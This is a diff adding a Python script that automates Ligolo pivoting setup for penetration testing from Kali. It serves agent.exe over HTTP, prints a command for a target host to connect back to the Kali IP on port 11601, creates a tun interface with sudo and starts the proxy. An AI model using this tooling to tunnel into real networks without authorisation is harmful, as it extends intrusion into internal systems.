@@ -1,0 +1,123 @@
+#!/usr/bin/env python3
+
+import subprocess
+import signal
+import sys
+import os
+import argparse
+import http.server
+import socketserver
+import threading
+
+# Function to print colored text
+def print_colored(text, color):
+    colors = {
+        "red": "\033[91m",
+        "green": "\033[92m",
+        "reset": "\033[0m"
+    }
+    return f"{colors[color]}{text}{colors['reset']}"
+
+# Function to handle Ctrl+C
+def signal_handler(sig, frame):
+    print("\nShutting down...")
+    sys.exit(0)
+
+# Function to serve the agent.exe using a simple HTTP server
+def serve_agent_exe(directory):
+    try:
+        os.chdir(directory)
+        port = 8000  # You can change the port if needed
+        handler = http.server.SimpleHTTPRequestHandler
+        httpd = socketserver.TCPServer(("", port), handler)
+
+        print(f"Serving agent.exe from {directory} on port {port}...")
+
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\nShutting down agent.exe server...")
+
+# Function to find the path to the agent.exe executable in the file system
+def find_agent_exe():
+    try:
+        # Searching for the agent.exe file recursively in the system
+        for root, dirs, files in os.walk(os.path.sep):
+            if "agent.exe" in files:
+                return os.path.join(root, "agent.exe")
+        raise FileNotFoundError("agent.exe not found.")
+    except FileNotFoundError as e:
+        print(print_colored(f"Error: {e}", "red"))
+        sys.exit(1)
+
+# Function to find the path to the Ligolo proxy binary in the file system
+def find_ligolo_proxy():
+    try:
+        # Searching for the proxy binary recursively in the system
+        for root, dirs, files in os.walk(os.path.sep):
+            for file in files:
+                if file == "proxy" and "ligolo" in root:  # Adjust the search criteria if needed
+                    return os.path.join(root, file)
+        raise FileNotFoundError("Ligolo proxy binary not found.")
+    except FileNotFoundError as e:
+        print(print_colored(f"Error: {e}", "red"))
+        sys.exit(1)
+
+# Register the signal handler for Ctrl+C
+signal.signal(signal.SIGINT, signal_handler)
+
+# Parse command-line arguments
+parser = argparse.ArgumentParser(description="Setup Ligolo and serve agent.exe")
+parser.add_argument("-a", "--agent", help="Path to the agent.exe executable")
+parser.add_argument("--proxy", help="Path to the Ligolo proxy binary")
+args = parser.parse_args()
+
+# Get the absolute path to the script
+script_dir = os.path.dirname(os.path.abspath(__file__))
+
+# Get Kali IP from the user's input
+user_ip = input("Enter your Kali machine's IP address: ")
+
+# Start a thread to serve agent.exe
+if args.agent:
+    agent_exe_path = args.agent
+else:
+    agent_exe_path = find_agent_exe()
+
+server_thread = threading.Thread(target=serve_agent_exe, args=(os.path.dirname(agent_exe_path),))
+server_thread.daemon = True
+server_thread.start()
+
+# Ligolo instructions
+print("# Download Ligolo agent from the following link and execute the following command:")
+print(print_colored(f"\n {agent_exe_path} -ignore-cert -connect {user_ip}:11601", "green"))
+print("\n\n# Execute the following in Ligolo")
+print(print_colored("\nsession", "green"))
+print(print_colored("\nifconfig", "green"))
+print("\n\n# Run the following in a separate terminal window:")
+print(print_colored(f"\nsudo ip route add <internalIP>.0/24 dev ligolo\n\n", "green"))
+
+# Commands to create a tunnel interface for Ligolo
+create_tun_cmd = f"sudo ip tuntap add mode tun user $USER name ligolo"
+set_up_cmd = "sudo ip link set ligolo up"
+
+# Create a tunnel interface for Ligolo
+try:
+    subprocess.run(create_tun_cmd, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    subprocess.run(set_up_cmd, shell=True, check=True)
+except subprocess.CalledProcessError as e:
+    # Check if the exit status is non-zero
+    if e.returncode != 0:
+        error_message = "Tunnel interface 'ligolo' could not be created or set up. Proceeding with caution."
+        print(print_colored("Warning: " + error_message, "red"))
+    else:
+        # Raise the error if it's a different one
+        raise e
+
+# Command: Find the Ligolo proxy binary and execute it
+if args.proxy:
+    ligolo_proxy_path = args.proxy
+else:
+    ligolo_proxy_path = find_ligolo_proxy()
+
+ligolo_cmd = f"{ligolo_proxy_path} -selfcert"
+subprocess.run(ligolo_cmd, shell=True, check=True)
